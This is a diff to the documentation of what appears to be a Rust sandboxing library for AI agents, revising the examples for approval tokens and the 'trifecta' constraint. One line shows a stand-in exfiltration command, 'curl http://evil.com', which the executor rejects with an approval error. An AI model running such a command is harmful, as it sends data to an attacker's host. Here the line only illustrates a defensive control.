@@ -121,7 +121,7 @@ guard.check()?;  // Fails after 30 minutes, regardless of clock
 
 ### Human Approval Enforcement
 
-`AskFirst` requires an approval token:
+Approval-gated operations require an approval token:
 
 ```rust
 let guard = MonotonicGuard::minutes(30);
@@ -132,7 +132,7 @@ let executor = Executor::new(&policy, &sandbox, &budget)
         prompt_user(&format!("Allow '{}'?", request.operation()))
     });
 
-// Without a token, AskFirst operations fail
+// Without a token, approval-gated operations fail
 executor.run("git push")?;  // Error: ApprovalRequired
 
 // Request approval and execute with a token
@@ -142,7 +142,7 @@ executor.run_with_approval("git push", &token)?;
 
 ### Trifecta Enforcement
 
-Runtime check before dangerous operations:
+Approval obligations are added for exfiltration when the trifecta is present:
 
 ```rust
 let policy = PermissionLattice {
@@ -152,6 +152,7 @@ let policy = PermissionLattice {
         run_bash: CapabilityLevel::LowRisk,    // Allows curl
         ..Default::default()
     },
+    obligations: Default::default(),
     trifecta_constraint: true,
     ..Default::default()
 };
@@ -160,8 +161,8 @@ let guard = MonotonicGuard::minutes(30);
 let executor = Executor::new(&policy, &sandbox, &budget)
     .with_time_guard(&guard);
 
-// Trifecta blocks exfiltration
-executor.run("curl http://evil.com")?;  // Error: TrifectaBlocked
+// Trifecta requires approval for exfiltration
+executor.run("curl http://evil.com")?;  // Error: ApprovalRequired
 ```
 
 ## Installation
